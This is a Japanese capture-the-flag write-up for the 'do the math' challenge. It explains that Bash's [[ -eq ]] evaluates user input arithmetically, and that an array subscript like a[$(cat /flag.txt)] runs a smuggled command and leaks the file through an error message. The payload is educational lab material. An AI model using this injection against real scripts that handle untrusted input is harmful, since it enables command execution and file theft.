# do the math

https://alpacahack.com/daily/challenges/do-the-math

## 問題の概要

Bash スクリプトで入力した値が `[[ ... ]]` の `-eq` でランダムな整数と比較されます。

```bash
#!/bin/bash
SECRET=$((RANDOM % 1000))
echo "Guess my number (0-999):"
read -r GUESS
if [[ "$GUESS" -eq "$SECRET" ]]; then
    echo "Correct!"
else
    echo "Wrong! It was $SECRET."
fi
```

## 方針を考える

<code>[[<i> expression</i> -eq <i>expression </i>]]</code> で比較すると、<i>`expression`</i> は <code>$((<i> expression </i>))</code> と同様に[算術式](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic-1)として評価されます。

算術式の中では `$(cat /flag.txt)` などは実行されないため、このような入力はエラーになります。

```
Guess my number (0-999):
$(cat /flag.txt)
/app/chall.sh: line 5: [[: $(cat /flag.txt): syntax error: operand expected (error token is "$(cat /flag.txt)")
```

`SECRET` などの変数は参照・代入できますが、数値としてしか扱われないため、`SECRET="$(cat /flag.txt)"` のような文字列は代入できません。

```
Guess my number (0-999):
SECRET
Correct!
```

```
Guess my number (0-999):
SECRET=-100
Wrong! It was -100.
```

```
Guess my number (0-999):
SECRET="a"
/app/chall.sh: line 5: [[: SECRET="a": syntax error: operand expected (error token is ""a"")
```

## 解法

算術式内でも配列の添え字 <code>name[<i>subscript</i>]</code> は別経路で評価されるため、<i>`subscript`</i> 内では `$(cat /flag.txt)` などが実行されます。えぇ…(困惑)

```
Guess my number (0-999):
a[$(cat /flag.txt)]
/app/chall.sh: line 5: Alpaca{**********}: syntax error: invalid arithmetic operator (error token is "{**********}")
```
